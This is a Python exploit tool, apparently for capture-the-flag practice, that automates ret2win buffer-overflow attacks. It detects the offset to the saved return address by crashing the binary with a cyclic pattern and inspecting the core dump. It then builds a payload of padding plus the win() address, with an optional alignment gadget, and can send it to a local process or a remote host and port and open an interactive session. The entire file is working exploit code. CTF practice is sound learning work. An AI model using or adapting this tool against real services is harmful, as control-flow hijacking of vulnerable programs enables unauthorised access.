#!/usr/bin/env python3
"""
ret2win.py - Ret2Win CTF Payload Generator

Give it a vulnerable binary and the address of a "win" function, and it will:
  1. Auto-detect the buffer-overflow offset to the saved return address by
     crashing the binary with a De Bruijn cyclic pattern and inspecting the
     resulting core dump (no manual GDB work needed).
  2. Build a ret2win payload: junk bytes up to the offset, followed by the
     packed win() address (with optional stack-alignment padding for x86_64).
  3. Optionally fire the payload straight at a local run or a remote service
     and drop you into an interactive shell.

Requirements:
    pip install pwntools

Usage examples:
    # Auto-detect the offset, then build + save the payload
    python3 ret2win.py --binary ./vuln --win-addr 0x401196

    # Already know the offset? Skip detection
    python3 ret2win.py --binary ./vuln --win-addr 0x401196 --offset 40

    # 64-bit target that needs stack alignment before the win() call
    python3 ret2win.py --binary ./vuln --win-addr 0x401196 --align --ret-gadget 0x40101a

    # Build the payload AND launch the binary locally, sending it immediately
    python3 ret2win.py --binary ./vuln --win-addr 0x401196 --run

    # Or fire it at a remote CTF service
    python3 ret2win.py --binary ./vuln --win-addr 0x401196 --remote ctf.example.com 1337

Notes:
  - Offset auto-detection assumes the vulnerable input is read from stdin
    and that sending a long-enough pattern reliably crashes the process.
    If your target reads input differently (argv, a file, a socket-only
    service, etc.), pass --offset manually.
  - If the binary is PIE, --win-addr must be the RUNTIME address
    (base + static offset) unless you've leaked the base yourself.
"""

import argparse
import os
import sys
import resource

try:
    from pwn import (
        context, process, remote, ELF, cyclic, cyclic_find, p32, p64, log,
    )
except ImportError:
    print("[!] This tool requires pwntools. Install it with: pip install pwntools")
    sys.exit(1)


def find_offset(binary_path, max_len=2048, input_mode="stdin"):
    """
    Crash the binary with a cyclic pattern and inspect the core dump to
    determine the offset to the saved return address (EIP/RIP).
    """
    # Make sure core dumps are enabled for this process tree
    try:
        resource.setrlimit(
            resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
        )
    except Exception as e:
        log.warning(f"Could not raise core dump limit: {e}")

    elf = ELF(binary_path)
    pattern = cyclic(max_len)

    log.info(f"Launching {binary_path} and sending a {max_len}-byte cyclic pattern...")
    p = process(binary_path)
    try:
        if input_mode == "stdin":
            p.sendline(pattern)
        else:
            raise ValueError(f"Unsupported input mode: {input_mode}")
        p.wait()
    except EOFError:
        pass

    core = p.corefile
    if core is None:
        log.error(
            "No core dump was produced. Make sure core dumps are enabled "
            "(ulimit -c unlimited on your shell too) and that the binary actually "
            "crashes on this input. You may need to pass --offset manually, or "
            "increase --max-len if the buffer is larger than the pattern."
        )
        sys.exit(1)

    fault_addr = core.rip if elf.bits == 64 else core.eip

    try:
        offset = cyclic_find(fault_addr, n=4 if elf.bits == 32 else 8)
    except Exception:
        log.error(
            f"Could not find instruction-pointer value {hex(fault_addr)} within the "
            "cyclic pattern. The crash may not be a direct return-address overwrite "
            "(e.g. it could be a bad pointer dereference instead), or the pattern "
            "needs to be longer (--max-len)."
        )
        sys.exit(1)

    log.success(f"Crash IP = {hex(fault_addr)} -> offset = {offset}")
    return offset


def build_payload(offset, win_addr, bits=64, align=False, ret_gadget=None):
    junk = b"A" * offset
    addr_packed = p64(win_addr) if bits == 64 else p32(win_addr)

    payload = junk

    if bits == 64 and align:
        # Many x86_64 targets need a 16-byte aligned stack before a `ret`
        # jumps into a function that itself performs further calls (e.g.
        # one using movaps-aligned SSE instructions, or calling system()).
        # Common trick: insert one extra lone `ret` gadget first.
        if ret_gadget:
            payload += p64(ret_gadget)
        else:
            log.warning(
                "No --ret-gadget supplied for stack alignment; continuing without it. "
                "If win() crashes immediately, find a lone `ret` gadget "
                "(e.g. `ROPgadget --binary <bin> --only ret`) and pass it with --ret-gadget."
            )

    payload += addr_packed
    return payload


def main():
    parser = argparse.ArgumentParser(description="Ret2Win CTF payload generator")
    parser.add_argument("--binary", required=True, help="Path to the target binary")
    parser.add_argument("--win-addr", required=True, help="Address of the win() function, e.g. 0x401196")
    parser.add_argument("--offset", type=int, default=None,
                         help="Known offset to the saved return address (skips auto-detection)")
    parser.add_argument("--max-len", type=int, default=2048,
                         help="Max cyclic pattern length used for offset auto-detection")
    parser.add_argument("--align", action="store_true",
                         help="Add stack-alignment padding (x86_64) before jumping to win()")
    parser.add_argument("--ret-gadget", default=None,
                         help="Address of a lone `ret` gadget, used together with --align")
    parser.add_argument("--input-mode", choices=["stdin"], default="stdin",
                         help="How input reaches the vulnerable buffer (currently stdin only)")
    parser.add_argument("--output", default="payload.bin", help="File to write the raw payload to")
    parser.add_argument("--run", action="store_true",
                         help="Launch the binary locally, send the payload, and go interactive")
    parser.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"),
                         help="Send the payload to a remote host:port instead of running locally")
    args = parser.parse_args()

    if not os.path.isfile(args.binary):
        log.error(f"Binary not found: {args.binary}")
        sys.exit(1)

    elf = ELF(args.binary)
    bits = 64 if elf.bits == 64 else 32
    win_addr = int(args.win_addr, 16) if args.win_addr.lower().startswith("0x") else int(args.win_addr)
    ret_gadget = None
    if args.ret_gadget:
        ret_gadget = int(args.ret_gadget, 16) if args.ret_gadget.lower().startswith("0x") else int(args.ret_gadget)

    log.info(f"Binary: {args.binary} ({bits}-bit, {'PIE' if elf.pie else 'no PIE'})")
    if elf.pie:
        log.warning(
            "This binary is PIE. --win-addr must be the RUNTIME address "
            "(base + static offset), not the static address from objdump/readelf, "
            "unless you've disabled ASLR and computed it yourself or leaked the base."
        )

    if args.offset is not None:
        offset = args.offset
        log.info(f"Using supplied offset: {offset}")
    else:
        offset = find_offset(args.binary, max_len=args.max_len, input_mode=args.input_mode)

    payload = build_payload(offset, win_addr, bits=bits, align=args.align, ret_gadget=ret_gadget)

    with open(args.output, "wb") as f:
        f.write(payload)

    log.success(f"Payload written to {args.output} ({len(payload)} bytes)")
    print(f"  offset   = {offset}")
    print(f"  win_addr = {hex(win_addr)}")
    print(f"  payload  = {payload}")

    if args.run or args.remote:
        if args.remote:
            host, port = args.remote
            conn = remote(host, int(port))
        else:
            conn = process(args.binary)
        conn.sendline(payload)
        conn.interactive()


if __name__ == "__main__":
    main()
